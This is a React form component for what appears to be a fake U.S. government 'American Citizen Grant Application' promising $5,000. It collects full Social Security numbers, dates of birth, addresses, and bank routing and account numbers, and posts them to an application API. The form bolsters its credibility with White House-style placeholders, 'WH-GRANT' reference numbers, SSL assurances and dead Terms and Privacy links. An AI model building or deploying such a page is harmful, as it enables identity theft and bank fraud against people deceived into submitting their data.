"use client";
import { useState, useId } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Lock, FileText, CheckCircle, AlertCircle, Eye, EyeOff, ShieldCheck } from "lucide-react";
import { ALL_AREA_CODES } from "@/lib/areaCodes";

type FormData = {
  firstName: string;
  lastName: string;
  dateOfBirth: string;
  ssn: string;
  email: string;
  phone: string;
  address: string;
  city: string;
  state: string;
  zipCode: string;
  annualIncome: string;
  routingNumber: string;
  accountNumber: string;
  accountType: string;
  consent: boolean;
};

type Errors = Partial<Record<keyof FormData, string>>;

const US_STATES = [
  "AL","AK","AZ","AR","CA","CO","CT","DE","FL","GA","HI","ID","IL","IN","IA",
  "KS","KY","LA","ME","MD","MA","MI","MN","MS","MO","MT","NE","NV","NH","NJ",
  "NM","NY","NC","ND","OH","OK","OR","PA","RI","SC","SD","TN","TX","UT","VT",
  "VA","WA","WV","WI","WY","DC",
];

function generateRef() {
  return `WH-GRANT-${Date.now().toString(36).toUpperCase()}-${Math.random().toString(36).slice(2,6).toUpperCase()}`;
}

function Required() {
  return <span className="required-star" aria-label="required">*</span>;
}

const Field = ({
  id, label, hint, error, children,
}: { id: string; label: string; hint?: string; error?: string; children: React.ReactNode }) => (
  <div className="form-field">
    <label htmlFor={id}>{label} <Required /></label>
    {hint && <span className="field-hint" id={`${id}-hint`}>{hint}</span>}
    {children}
    {error && (
      <span className="field-error" role="alert">
        <AlertCircle size={12} />
        {error}
      </span>
    )}
  </div>
);

export default function GrantForm() {
  const uid = useId();
  const [data, setData] = useState<FormData>({
    firstName: "", lastName: "", dateOfBirth: "", ssn: "",
    email: "", phone: "", address: "", city: "", state: "",
    zipCode: "", annualIncome: "", routingNumber: "", accountNumber: "",
    accountType: "checking", consent: false,
  });
  const [errors, setErrors] = useState<Errors>({});
  const [submitting, setSubmitting] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [showConfirm, setShowConfirm] = useState(false);
  const [refNumber, setRefNumber] = useState("");
  const [showAccount, setShowAccount] = useState(false);

  const set = (key: keyof FormData) => (
    e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>
  ) => {
    const value = e.target.type === "checkbox"
      ? (e.target as HTMLInputElement).checked
      : e.target.value;
    setData((d) => ({ ...d, [key]: value }));
    if (errors[key]) setErrors((er) => ({ ...er, [key]: undefined }));
  };

  function validate(): Errors {
    const e: Errors = {};
    if (!data.firstName.trim()) e.firstName = "First name is required.";
    if (!data.lastName.trim()) e.lastName = "Last name is required.";
    if (!data.dateOfBirth) e.dateOfBirth = "Date of birth is required.";
    else {
      const age = (new Date().getTime() - new Date(data.dateOfBirth).getTime()) / (365.25 * 24 * 3600 * 1000);
      if (age < 18) e.dateOfBirth = "You must be 18 or older to apply.";
    }
    if (!data.ssn || !/^\d{9}$/.test(data.ssn)) e.ssn = "Enter a valid 9-digit SSN.";
    if (!data.email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.email)) e.email = "Enter a valid email address.";
    if (!data.phone || !/^\+?[\d\s\-()]{10,}$/.test(data.phone)) e.phone = "Enter a valid phone number.";
    if (!data.address.trim()) e.address = "Address is required.";
    if (!data.city.trim()) e.city = "City is required.";
    if (!data.state) e.state = "Select a state.";
    if (!data.zipCode || !/^\d{5}(-\d{4})?$/.test(data.zipCode)) e.zipCode = "Enter a valid ZIP code.";
    if (!data.annualIncome) e.annualIncome = "Annual income is required.";
    if (!data.routingNumber || !/^\d{9}$/.test(data.routingNumber)) e.routingNumber = "Enter a valid 9-digit routing number.";
    if (!data.accountNumber || data.accountNumber.length < 4) e.accountNumber = "Enter a valid account number.";
    if (!data.consent) e.consent = "You must agree to continue.";
    return e;
  }

  function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    const errs = validate();
    if (Object.keys(errs).length > 0) { setErrors(errs); return; }
    setShowConfirm(true);
  }

  async function processSubmit() {
    setSubmitting(true);
    try {
      const response = await fetch('/api/applications', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
      });
      
      const result = await response.json();
      
      if (!response.ok) {
        if (result.details) {
          const apiErrors: Errors = {};
          result.details.forEach((err: any) => {
            if (err.path && err.path[0]) {
              apiErrors[err.path[0] as keyof FormData] = err.message;
            }
          });
          setErrors(apiErrors);
          setShowConfirm(false);
        } else {
          alert(result.error || 'Failed to submit application');
          setShowConfirm(false);
        }
      } else {
        setRefNumber(result.referenceNumber);
        setSubmitted(true);
        setShowConfirm(false);
      }
    } catch (err) {
      alert('An unexpected error occurred.');
      setShowConfirm(false);
    } finally {
      setSubmitting(false);
    }
  }


  if (submitted) {
    return (
      <div className="grant-form-card">
        <div className="grant-form-header">
          <div className="form-icon"><CheckCircle size={22} color="white" /></div>
          <div>
            <h3>Application Submitted</h3>
            <span>Reference: {refNumber}</span>
          </div>
        </div>
        <AnimatePresence>
          <motion.div
            className="success-state"
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5 }}
          >
            <div className="success-icon">
              <CheckCircle size={40} color="white" />
            </div>
            <h3>Application Received!</h3>
            <p>
              Thank you, <strong>{data.firstName} {data.lastName}</strong>. Your $5,000 grant application
              has been successfully submitted and is now under review.
            </p>
            <p>You will receive a confirmation to <strong>{data.email}</strong> within 24–48 hours.</p>
            <div className="reference-number">
              Reference #: {refNumber}
            </div>
            <p style={{ fontSize: "0.8rem", color: "var(--gray-50)" }}>
              Keep this reference number for your records. Processing time is typically 7–14 business days.
            </p>
          </motion.div>
        </AnimatePresence>
      </div>
    );
  }

  return (
    <motion.div
      className="grant-form-card"
      initial={{ opacity: 0, y: 30 }}
      whileInView={{ opacity: 1, y: 0 }}
      viewport={{ once: true }}
      transition={{ duration: 0.6 }}
    >
      {/* Form header */}
      <div className="grant-form-header">
        <div className="form-icon">
          <FileText size={22} color="white" />
        </div>
        <div>
          <h3>American Citizen Grant Application</h3>
          <span>Form ACG-5000 · Secure Online Application</span>
        </div>
      </div>

      <form
        className="grant-form-body"
        onSubmit={handleSubmit}
        noValidate
        aria-label="Grant Application Form"
      >
        {/* ── PERSONAL INFORMATION ── */}
        <p className="form-section-label">Personal Information</p>

        <div className="form-row">
          <Field id={`${uid}-fn`} label="First Name" error={errors.firstName}>
            <input
              id={`${uid}-fn`}
              type="text"
              autoComplete="given-name"
              value={data.firstName}
              onChange={set("firstName")}
              className={errors.firstName ? "error" : ""}
              placeholder="John"
            />
          </Field>
          <Field id={`${uid}-ln`} label="Last Name" error={errors.lastName}>
            <input
              id={`${uid}-ln`}
              type="text"
              autoComplete="family-name"
              value={data.lastName}
              onChange={set("lastName")}
              className={errors.lastName ? "error" : ""}
              placeholder="Smith"
            />
          </Field>
        </div>

        <div className="form-row">
          <Field id={`${uid}-dob`} label="Date of Birth" hint="Must be 18 or older" error={errors.dateOfBirth}>
            <input
              id={`${uid}-dob`}
              type="date"
              autoComplete="bday"
              value={data.dateOfBirth}
              onChange={set("dateOfBirth")}
              className={errors.dateOfBirth ? "error" : ""}
              max={new Date(new Date().setFullYear(new Date().getFullYear() - 18)).toISOString().split("T")[0]}
            />
          </Field>
          <Field id={`${uid}-ssn`} label="Social Security Number (SSN)" hint="9-digit number" error={errors.ssn}>
            <input
              id={`${uid}-ssn`}
              type="password"
              inputMode="numeric"
              maxLength={9}
              autoComplete="off"
              value={data.ssn}
              onChange={(e) => {
                if (/^\d{0,9}$/.test(e.target.value)) set("ssn")(e);
              }}
              className={errors.ssn ? "error" : ""}
              placeholder="•••••••••"
            />
          </Field>
        </div>

        <hr className="form-divider" />

        {/* ── CONTACT INFORMATION ── */}
        <p className="form-section-label">Contact Information</p>

        <div className="form-row">
          <Field id={`${uid}-email`} label="Email Address" error={errors.email}>
            <input
              id={`${uid}-email`}
              type="email"
              autoComplete="email"
              value={data.email}
              onChange={set("email")}
              className={errors.email ? "error" : ""}
              placeholder="john.smith@email.com"
            />
          </Field>
          <Field id={`${uid}-phone`} label="Phone Number" error={errors.phone}>
            <div style={{ display: "flex", gap: "0.5rem" }}>
              <div style={{ display: "flex", position: "relative", width: "11rem" }}>
                <span style={{ 
                  display: "flex", alignItems: "center", padding: "0 0.5rem",
                  backgroundColor: "#f0f0f0", border: "1px solid #adadad", borderRight: "none",
                  borderTopLeftRadius: "0.375rem", borderBottomLeftRadius: "0.375rem",
                  color: "#454545", fontWeight: "bold", fontSize: "0.75rem"
                }}>
                  🇺🇸 +1
                </span>
                <select
                  value={data.phone.slice(0, 3)}
                  onChange={(e) => {
                    const prefix = e.target.value;
                    const rest = data.phone.slice(3);
                    setData((d) => ({ ...d, phone: prefix + rest }));
                    if (errors.phone) setErrors((er) => ({ ...er, phone: undefined }));
                  }}
                  className={errors.phone && data.phone.length < 3 ? "error" : ""}
                  style={{ borderTopLeftRadius: 0, borderBottomLeftRadius: 0, flex: 1, padding: "0.5rem", fontSize: "0.85rem" }}
                >
                  <option value="">Prefix...</option>
                  {ALL_AREA_CODES.map(({ state, code }) => (
                    <option key={`${state}-${code}`} value={code}>
                      {state} ({code})
                    </option>
                  ))}
                </select>
              </div>
              <input
                id={`${uid}-phone`}
                type="tel"
                autoComplete="tel-local"
                value={
                  data.phone.length > 6
                    ? `${data.phone.slice(3, 6)}-${data.phone.slice(6, 10)}`
                    : data.phone.slice(3)
                }
                maxLength={8}
                onChange={(e) => {
                  const val = e.target.value.replace(/\D/g, '');
                  const prefix = data.phone.slice(0, 3);
                  setData((d) => ({ ...d, phone: prefix + val }));
                  if (errors.phone) setErrors((er) => ({ ...er, phone: undefined }));
                }}
                className={errors.phone && data.phone.length >= 3 ? "error" : ""}
                placeholder="000-0000"
                style={{ flex: 1, paddingLeft: "1rem" }}
              />
            </div>
          </Field>
        </div>

        <hr className="form-divider" />

        {/* ── HOME ADDRESS ── */}
        <p className="form-section-label">Home Address</p>

        <Field id={`${uid}-address`} label="Street Address" error={errors.address}>
          <input
            id={`${uid}-address`}
            type="text"
            autoComplete="street-address"
            value={data.address}
            onChange={set("address")}
            className={errors.address ? "error" : ""}
            placeholder="123 Main Street"
          />
        </Field>

        <div className="form-row">
          <Field id={`${uid}-city`} label="City" error={errors.city}>
            <input
              id={`${uid}-city`}
              type="text"
              autoComplete="address-level2"
              value={data.city}
              onChange={set("city")}
              className={errors.city ? "error" : ""}
              placeholder="Washington"
            />
          </Field>
          <Field id={`${uid}-state`} label="State" error={errors.state}>
            <select
              id={`${uid}-state`}
              autoComplete="address-level1"
              value={data.state}
              onChange={set("state")}
              className={errors.state ? "error" : ""}
            >
              <option value="">Select state…</option>
              {US_STATES.map((s) => <option key={s} value={s}>{s}</option>)}
            </select>
          </Field>
        </div>

        <div className="form-row">
          <Field id={`${uid}-zip`} label="ZIP Code" error={errors.zipCode}>
            <input
              id={`${uid}-zip`}
              type="text"
              autoComplete="postal-code"
              inputMode="numeric"
              maxLength={10}
              value={data.zipCode}
              onChange={(e) => {
                let val = e.target.value.replace(/[^\d]/g, '');
                if (val.length > 5) {
                  val = val.slice(0, 5) + '-' + val.slice(5, 9);
                }
                setData((d) => ({ ...d, zipCode: val }));
                if (errors.zipCode) setErrors((er) => ({ ...er, zipCode: undefined }));
              }}
              className={errors.zipCode ? "error" : ""}
              placeholder="20500"
            />
          </Field>
          <Field id={`${uid}-income`} label="Annual Household Income" error={errors.annualIncome}>
            <select
              id={`${uid}-income`}
              value={data.annualIncome}
              onChange={set("annualIncome")}
              className={errors.annualIncome ? "error" : ""}
            >
              <option value="">Select range…</option>
              <option value="under-25k">Under $25,000</option>
              <option value="25k-50k">$25,000 – $50,000</option>
              <option value="50k-75k">$50,000 – $75,000</option>
              <option value="75k-100k">$75,000 – $100,000</option>
              <option value="over-100k">Over $100,000</option>
            </select>
          </Field>
        </div>

        <hr className="form-divider" />

        {/* ── BANK INFORMATION ── */}
        <p className="form-section-label">Bank Account Information</p>

        <div className="bank-warning">
          <ShieldCheck size={14} aria-hidden="true" style={{ flexShrink: 0, marginTop: 2 }} />
          <span>
            <strong>Why do we need this?</strong> Your grant funds will be deposited directly to your
            U.S. bank account via ACH transfer. This information is encrypted with 256-bit SSL and
            used solely for grant disbursement.
          </span>
        </div>

        <Field id={`${uid}-acct-type`} label="Account Type" error={errors.accountType}>
          <select
            id={`${uid}-acct-type`}
            value={data.accountType}
            onChange={set("accountType")}
          >
            <option value="checking">Checking</option>
            <option value="savings">Savings</option>
          </select>
        </Field>

        <div className="form-row">
          <Field id={`${uid}-routing`} label="ABA Routing Number" hint="9-digit number (bottom-left of check)" error={errors.routingNumber}>
            <input
              id={`${uid}-routing`}
              type="text"
              inputMode="numeric"
              maxLength={9}
              autoComplete="off"
              value={data.routingNumber}
              onChange={(e) => {
                const val = e.target.value.replace(/\D/g, '');
                setData((d) => ({ ...d, routingNumber: val.slice(0, 9) }));
                if (errors.routingNumber) setErrors((er) => ({ ...er, routingNumber: undefined }));
              }}
              className={errors.routingNumber ? "error" : ""}
              placeholder="123456789"
            />
          </Field>
          <Field id={`${uid}-account`} label="Account Number" hint="Found on bottom of check" error={errors.accountNumber}>
            <div style={{ position: "relative" }}>
              <input
                id={`${uid}-account`}
                type={showAccount ? "text" : "password"}
                inputMode="numeric"
                maxLength={17}
                autoComplete="off"
                value={data.accountNumber}
                onChange={(e) => {
                  const val = e.target.value.replace(/\D/g, '');
                  setData((d) => ({ ...d, accountNumber: val }));
                  if (errors.accountNumber) setErrors((er) => ({ ...er, accountNumber: undefined }));
                }}
                className={errors.accountNumber ? "error" : ""}
                placeholder="•••••••••••••••••"
                style={{ paddingRight: "2.5rem" }}
              />
              <button
                type="button"
                aria-label={showAccount ? "Hide account number" : "Show account number"}
                onClick={() => setShowAccount(!showAccount)}
                style={{
                  position: "absolute", right: "0.6rem", top: "50%",
                  transform: "translateY(-50%)", background: "none", border: "none",
                  cursor: "pointer", color: "var(--gray-50)", display: "flex",
                }}
              >
                {showAccount ? <EyeOff size={16} /> : <Eye size={16} />}
              </button>
            </div>
          </Field>
        </div>

        <hr className="form-divider" />

        {/* ── CONSENT ── */}
        <div className="consent-row">
          <input
            type="checkbox"
            id={`${uid}-consent`}
            checked={data.consent}
            onChange={set("consent")}
            aria-describedby={errors.consent ? `${uid}-consent-err` : undefined}
          />
          <label htmlFor={`${uid}-consent`}>
            I certify that I am a U.S. citizen or lawful permanent resident, age 18 or older, and
            that all information provided is true and accurate to the best of my knowledge.
            I agree to the{" "}
            <a href="#" onClick={(e) => e.preventDefault()}>Terms & Conditions</a>
            {" "}and{" "}
            <a href="#" onClick={(e) => e.preventDefault()}>Privacy Policy</a>.
          </label>
        </div>
        {errors.consent && (
          <span className="field-error" id={`${uid}-consent-err`} role="alert" style={{ marginBottom: "1rem", display: "flex" }}>
            <AlertCircle size={12} /> {errors.consent}
          </span>
        )}

        {/* ── SUBMIT ── */}
        <div className="form-submit-row">
          <motion.button
            type="submit"
            className="btn btn-primary btn-full btn-lg"
            disabled={submitting}
            whileHover={!submitting ? { scale: 1.02 } : {}}
            whileTap={!submitting ? { scale: 0.98 } : {}}
            id="form-submit-btn"
          >
            {submitting ? (
              <>
                <span style={{
                  display: "inline-block",
                  width: "16px", height: "16px",
                  border: "2px solid rgba(255,255,255,0.4)",
                  borderTopColor: "white",
                  borderRadius: "50%",
                  animation: "spin 0.7s linear infinite",
                }} />
                Processing Application…
              </>
            ) : (
              <>
                <Lock size={16} />
                Submit Secure Application
              </>
            )}
          </motion.button>

          <div className="ssl-row">
            <Lock size={12} />
            <span>256-bit SSL Encrypted · Your information is protected</span>
          </div>
        </div>
      </form>

      {/* ── CONFIRMATION MODAL ── */}
      <AnimatePresence>
        {showConfirm && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            style={{
              position: "fixed", top: 0, left: 0, right: 0, bottom: 0, 
              backgroundColor: "rgba(0,0,0,0.6)", zIndex: 9999,
              display: "flex", alignItems: "center", justifyContent: "center", padding: "1rem"
            }}
          >
            <motion.div
              initial={{ scale: 0.95, y: 10 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.95, y: 10 }}
              style={{
                background: "white", padding: "2rem", borderRadius: "12px", maxWidth: "450px", width: "100%",
                boxShadow: "0 10px 25px rgba(0,0,0,0.2)", textAlign: "center"
              }}
            >
              <div style={{ 
                width: "48px", height: "48px", borderRadius: "50%", background: "#fef0d8", 
                display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 1rem"
              }}>
                <ShieldCheck size={24} color="#855b06" />
              </div>
              <h3 style={{ marginTop: 0, color: "#162e51", fontSize: "1.25rem", fontFamily: "var(--font-serif)" }}>
                Confirm Submission
              </h3>
              <p style={{ color: "#454545", fontSize: "0.95rem", lineHeight: "1.5", marginBottom: "1.5rem" }}>
                Are you sure you want to submit your application? By clicking confirm, you certify that all the information provided is accurate and you consent to the direct deposit.
              </p>
              <div style={{ display: "flex", gap: "1rem", justifyContent: "center", flexWrap: "wrap" }}>
                <button 
                  type="button"
                  onClick={() => setShowConfirm(false)}
                  disabled={submitting}
                  style={{
                    padding: "0.75rem 1.5rem", borderRadius: "6px", border: "1px solid #adadad",
                    background: "transparent", color: "#454545", fontWeight: "bold", cursor: submitting ? "not-allowed" : "pointer", flex: 1
                  }}
                >
                  Cancel
                </button>
                <button 
                  type="button"
                  onClick={processSubmit}
                  disabled={submitting}
                  style={{
                    padding: "0.75rem 1.5rem", borderRadius: "6px", border: "none",
                    background: "#1a4480", color: "white", fontWeight: "bold", cursor: submitting ? "not-allowed" : "pointer",
                    display: "flex", alignItems: "center", justifyContent: "center", gap: "0.5rem", flex: 1
                  }}
                >
                  {submitting ? (
                    <>
                      <span style={{
                        display: "inline-block", width: "16px", height: "16px",
                        border: "2px solid rgba(255,255,255,0.4)", borderTopColor: "white",
                        borderRadius: "50%", animation: "spin 0.7s linear infinite"
                      }} />
                      Processing...
                    </>
                  ) : "Confirm"}
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
    </motion.div>
  );
}
